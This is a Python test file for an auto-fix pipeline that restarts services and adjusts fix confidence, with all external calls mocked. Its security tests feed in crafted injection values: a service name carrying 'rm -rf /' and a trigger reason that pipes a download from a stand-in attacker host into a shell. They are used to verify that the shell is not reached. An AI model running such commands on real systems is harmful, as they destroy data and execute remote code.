#!/usr/bin/env python3
"""
test_nova_autofix.py — Tests for nova_autofix.py (Auto-Fix Pipeline #29).

Focus (high-risk): autonomous shell=True auto-fix.
  - Unit: the decision/gating logic in check_trigger (what triggers a fix).
  - Security: crafted service/log/trigger values cannot inject an arbitrary
    shell command. Service restarts go through argv (no shell=True), and
    runtime trigger reasons never reach the shell in the "command" branch.
  - Confidence learning: success raises confidence, failure lowers it.

All external deps (psycopg2, subprocess, sockets, urllib, notify, Grafana)
are mocked — nothing hits a live service or DB.

Written by Jordan Koch.
"""

import os
import sys
from pathlib import Path
from unittest.mock import MagicMock, patch, call

import pytest

sys.path.insert(0, str(Path(__file__).parent.parent))

import nova_autofix as m


# ── Helpers ──────────────────────────────────────────────────────────────────


def _fake_conn(fetchone_val=None):
    """A MagicMock connection whose cursor().fetchone() returns fetchone_val."""
    conn = MagicMock()
    cur = MagicMock()
    cur.fetchone.return_value = fetchone_val
    conn.cursor.return_value = cur
    return conn


@pytest.fixture
def quiet_side_effects():
    """Silence the reporting/DB side-effects that apply_fix triggers, and reset stats."""
    saved = dict(m._stats)
    m._stats.update({"checks": 0, "fixes_applied": 0, "fixes_succeeded": 0, "fixes_failed": 0})
    with patch.object(m, "notify"), \
         patch.object(m, "_annotate_grafana"), \
         patch.object(m, "_observe"), \
         patch.object(m, "_update_attempt"), \
         patch.object(m, "_adjust_confidence") as adj, \
         patch.object(m, "log"), \
         patch("nova_autofix.time.sleep"):
        yield adj
    m._stats.clear()
    m._stats.update(saved)


# ── Unit: check_trigger decision/gating logic ────────────────────────────────


class TestCheckTriggerServiceDown:
    def test_fires_when_port_dead(self):
        p = {"trigger_condition": {"service_down": "ollama", "port": 11434}}
        with patch.object(m, "_port_alive", return_value=False):
            triggered, reason = m.check_trigger(p, {})
        assert triggered is True
        assert "ollama" in reason and "11434" in reason

    def test_silent_when_port_alive(self):
        p = {"trigger_condition": {"service_down": "ollama", "port": 11434}}
        with patch.object(m, "_port_alive", return_value=True):
            triggered, reason = m.check_trigger(p, {})
        assert triggered is False
        assert reason is None

    def test_no_port_means_no_trigger(self):
        # A service_down trigger without a port cannot be evaluated -> no fire.
        p = {"trigger_condition": {"service_down": "ollama"}}
        with patch.object(m, "_port_alive", return_value=False) as pa:
            triggered, _ = m.check_trigger(p, {})
        assert triggered is False
        pa.assert_not_called()

    def test_default_host_passed_to_port_check(self):
        p = {"trigger_condition": {"service_down": "svc", "port": 9999}}
        with patch.object(m, "_port_alive", return_value=True) as pa:
            m.check_trigger(p, {})
        pa.assert_called_once_with(9999, "127.0.0.1")


class TestCheckTriggerErrorPattern:
    def test_matches_regex_in_recent_error(self):
        p = {"trigger_condition": {"error_pattern": "OOMKilled", "task_id": "t1"}}
        with patch.object(m, "_get_recent_error", return_value="process OOMKilled at 3am"):
            triggered, reason = m.check_trigger(p, {})
        assert triggered is True
        assert "OOMKilled" in reason

    def test_no_match_does_not_fire(self):
        p = {"trigger_condition": {"error_pattern": "OOMKilled", "task_id": "t1"}}
        with patch.object(m, "_get_recent_error", return_value="clean exit"):
            triggered, _ = m.check_trigger(p, {})
        assert triggered is False

    def test_no_recent_error_does_not_fire(self):
        p = {"trigger_condition": {"error_pattern": "boom", "task_id": "t1"}}
        with patch.object(m, "_get_recent_error", return_value=None):
            triggered, _ = m.check_trigger(p, {})
        assert triggered is False


class TestCheckTriggerConsecutiveFailures:
    def test_fires_at_threshold(self):
        p = {"trigger_condition": {"consecutive_failures": 3, "task_id": "t1"}}
        with patch.object(m, "_get_consecutive_failures", return_value=3):
            triggered, reason = m.check_trigger(p, {})
        assert triggered is True
        assert "3 consecutive" in reason

    def test_below_threshold_silent(self):
        p = {"trigger_condition": {"consecutive_failures": 3, "task_id": "t1"}}
        with patch.object(m, "_get_consecutive_failures", return_value=2):
            triggered, _ = m.check_trigger(p, {})
        assert triggered is False


class TestCheckTriggerMetricAbove:
    def test_fires_above_threshold(self):
        p = {"trigger_condition": {"metric_above": "cpu", "threshold": 90, "device": "d1"}}
        with patch.object(m, "_get_latest_metric", return_value=95):
            triggered, reason = m.check_trigger(p, {})
        assert triggered is True
        assert "95" in reason

    def test_at_threshold_is_not_above(self):
        p = {"trigger_condition": {"metric_above": "cpu", "threshold": 90}}
        with patch.object(m, "_get_latest_metric", return_value=90):
            triggered, _ = m.check_trigger(p, {})
        assert triggered is False

    def test_missing_metric_silent(self):
        p = {"trigger_condition": {"metric_above": "cpu", "threshold": 90}}
        with patch.object(m, "_get_latest_metric", return_value=None):
            triggered, _ = m.check_trigger(p, {})
        assert triggered is False


class TestCheckTriggerSecurityCritical:
    def test_fires_when_critical_findings_exist(self):
        p = {"trigger_condition": {"security_critical": True, "host": "mac-studio"}}
        with patch.object(m, "_conn", return_value=_fake_conn(fetchone_val=(2,))):
            triggered, reason = m.check_trigger(p, {})
        assert triggered is True
        assert "mac-studio" in reason

    def test_silent_when_no_findings(self):
        p = {"trigger_condition": {"security_critical": True, "host": "mac-studio"}}
        with patch.object(m, "_conn", return_value=_fake_conn(fetchone_val=(0,))):
            triggered, _ = m.check_trigger(p, {})
        assert triggered is False


class TestCheckTriggerNoMatch:
    def test_unknown_trigger_returns_false_none(self):
        p = {"trigger_condition": {"something_unknown": 1}}
        assert m.check_trigger(p, {}) == (False, None)

    def test_empty_trigger(self):
        p = {"trigger_condition": {}}
        assert m.check_trigger(p, {}) == (False, None)


# ── Security invariant: no shell injection via service/log values ────────────


class TestSecurityRestartUsesArgvNotShell:
    def test_malicious_service_name_is_single_argv_token(self, quiet_side_effects):
        """A crafted service value must be passed as one argv element to
        launchctl — never through a shell — so metacharacters cannot inject."""
        evil = "net.digitalnoise.evil; rm -rf / #"
        pattern = {
            "id": 1,
            "pattern_name": "evil_restart",
            "fix_action": {"type": "restart", "service": evil},
        }
        with patch.object(m, "_conn", return_value=_fake_conn(fetchone_val=(42,))), \
             patch("nova_autofix.subprocess.run") as srun:
            srun.return_value = MagicMock(returncode=0, stderr="")
            m.apply_fix(pattern, "trigger reason")

        srun.assert_called_once()
        args, kwargs = srun.call_args
        # First positional arg is an argv LIST, not a shell string.
        assert isinstance(args[0], list)
        # shell=True must NOT be used for restarts.
        assert kwargs.get("shell", False) is not True
        # The evil string survives verbatim as ONE token (no splitting/eval).
        expected = f"gui/{os.getuid()}/{evil}"
        assert expected in args[0]
        assert args[0][:3] == ["launchctl", "kickstart", "-k"]

    def test_command_branch_does_not_interpolate_trigger_reason(self, quiet_side_effects):
        """The shell=True 'command' branch executes only the static pattern
        command. Runtime trigger reasons (derived from service/log values)
        must never be interpolated into the shell string."""
        static_cmd = "pkill ollama; sleep 3; open -a Ollama"
        pattern = {
            "id": 2,
            "pattern_name": "ollama_restart",
            "fix_action": {"type": "command", "command": static_cmd, "service": "ollama"},
        }
        injected = "$(curl evil.example/x | sh)"
        with patch.object(m, "_conn", return_value=_fake_conn(fetchone_val=(7,))), \
             patch("nova_autofix.subprocess.run") as srun:
            srun.return_value = MagicMock(returncode=0, stderr="")
            m.apply_fix(pattern, trigger_reason=injected)

        srun.assert_called_once()
        args, kwargs = srun.call_args
        assert args[0] == static_cmd            # exactly the static command
        assert injected not in args[0]          # crafted reason never reaches shell
        assert kwargs.get("shell") is True      # this branch does use a shell...
        # ...but only on the operator-seeded static command, not runtime input.


# ── Confidence learning + apply_fix outcome paths ────────────────────────────


class TestApplyFixOutcomes:
    def test_success_path_bumps_confidence_up(self, quiet_side_effects):
        adj = quiet_side_effects
        pattern = {"id": 10, "pattern_name": "p", "fix_action": {"type": "restart", "service": "svc"}}
        with patch.object(m, "_conn", return_value=_fake_conn(fetchone_val=(1,))), \
             patch("nova_autofix.subprocess.run", return_value=MagicMock(returncode=0, stderr="")):
            m.apply_fix(pattern, "reason")
        adj.assert_called_once_with(10, success=True)
        assert m._stats["fixes_succeeded"] == 1
        assert m._stats["fixes_failed"] == 0

    def test_failed_health_check_marks_failure(self, quiet_side_effects):
        adj = quiet_side_effects
        pattern = {
            "id": 11,
            "pattern_name": "p",
            "fix_action": {"type": "restart", "service": "svc",
                           "health_check_url": "http://x/health"},
        }
        with patch.object(m, "_conn", return_value=_fake_conn(fetchone_val=(1,))), \
             patch("nova_autofix.subprocess.run", return_value=MagicMock(returncode=0, stderr="")), \
             patch.object(m, "_check_health", return_value=False):
            m.apply_fix(pattern, "reason")
        adj.assert_called_once_with(11, success=False)
        assert m._stats["fixes_failed"] == 1
        assert m._stats["fixes_succeeded"] == 0

    def test_command_nonzero_returncode_is_failure(self, quiet_side_effects):
        adj = quiet_side_effects
        pattern = {"id": 12, "pattern_name": "p",
                   "fix_action": {"type": "command", "command": "false", "service": "svc"}}
        with patch.object(m, "_conn", return_value=_fake_conn(fetchone_val=(1,))), \
             patch("nova_autofix.subprocess.run",
                   return_value=MagicMock(returncode=1, stderr="boom")):
            m.apply_fix(pattern, "reason")
        adj.assert_called_once_with(12, success=False)
        assert m._stats["fixes_failed"] == 1

    def test_deploy_type_enqueues_request_not_shell(self, quiet_side_effects):
        """The 'deploy' branch must go through a DB deploy_request, never a shell."""
        adj = quiet_side_effects
        pattern = {"id": 13, "pattern_name": "p",
                   "fix_action": {"type": "deploy", "service": "svc", "action": "restart"}}
        fake = _fake_conn(fetchone_val=(1,))
        with patch.object(m, "_conn", return_value=fake), \
             patch("nova_autofix.subprocess.run") as srun:
            m.apply_fix(pattern, "reason")
        srun.assert_not_called()                 # no subprocess at all for deploy
        adj.assert_called_once_with(13, success=True)


# ── Confidence adjustment SQL clamps (unit, DB mocked) ───────────────────────


class TestAdjustConfidence:
    def test_success_increments_and_clamps_high(self):
        fake = _fake_conn()
        with patch.object(m, "_conn", return_value=fake):
            m._adjust_confidence(5, success=True)
        sql = fake.cursor.return_value.execute.call_args[0][0]
        assert "success_count = success_count + 1" in sql
        assert "LEAST(0.99" in sql

    def test_failure_decrements_and_clamps_low(self):
        fake = _fake_conn()
        with patch.object(m, "_conn", return_value=fake):
            m._adjust_confidence(5, success=False)
        sql = fake.cursor.return_value.execute.call_args[0][0]
        assert "failure_count = failure_count + 1" in sql
        assert "GREATEST(0.1" in sql


# ── get_active_patterns gating by confidence threshold ───────────────────────


class TestGetActivePatterns:
    def test_filters_by_confidence_threshold(self):
        fake = MagicMock()
        cur = MagicMock()
        cur.fetchall.return_value = [{"id": 1, "confidence": 0.9}]
        fake.cursor.return_value = cur
        with patch.object(m, "_conn", return_value=fake):
            rows = m.get_active_patterns()
        sql = cur.execute.call_args[0][0]
        params = cur.execute.call_args[0][1]
        assert "enabled = true" in sql
        assert "confidence >= %s" in sql
        assert params == (m.CONFIDENCE_THRESHOLD,)
        assert rows == [{"id": 1, "confidence": 0.9}]


if __name__ == "__main__":
    sys.exit(pytest.main([__file__, "-q"]))
